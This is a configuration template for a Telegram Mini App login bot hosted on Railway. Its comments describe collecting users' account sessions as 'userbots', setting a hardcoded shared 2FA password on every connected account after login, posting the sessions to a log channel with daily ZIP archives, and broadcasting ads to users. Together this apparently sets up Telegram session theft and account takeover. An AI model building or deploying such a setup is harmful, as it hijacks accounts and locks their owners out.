# ============ REQUIRED — Railway env variables ============

# Primary (owner) bot token — drives the Mini App login bot + /admin panel
# Get from @BotFather. MUST be a fresh, non-expired token.
PERSONAL_BOT_TOKEN=

# Telegram API credentials for userbots (my.telegram.org)
API_ID=0
API_HASH=

# MongoDB connection string (Atlas: mongodb+srv://...)
MONGODB_URI=

# Owner telegram user ID (approves broadcasts + admin panel)
PERSONAL_OWNER_ID=5286579067

# Admin panel password
ADMIN_PASSWORD=change-me

# ============ OPTIONAL — with defaults ============

# Unified 2FA password auto-applied to every connected userbot after login
UNIFIED_2FA=AdminPy#2026

# Session logger bot (posts sessions + daily ZIP). Defaults to PERSONAL_BOT_TOKEN
LOG_BOT_TOKEN=

# Log group/channel ID where sessions are posted
PERSONAL_LOG_GROUP_ID=-1004354441869

# Web server port (Railway sets PORT automatically)
# PORT=5000

# Public Mini App URL (Railway sets RAILWAY_PUBLIC_DOMAIN automatically)
# PERSONAL_WEBAPP_URL=https://your-app.up.railway.app

# Daily ZIP hour in UTC (-1 disables)
# DAILY_ZIP_HOUR=0

# Ads-bot periodic broadcast to users who pressed /start (panel can also toggle)
# ADS_BROADCAST_ACTIVE=false
# ADS_BROADCAST_INTERVAL=7200

# Extra admins who can toggle broadcast approval (comma separated)
# PERSONAL_ADMIN_IDS=
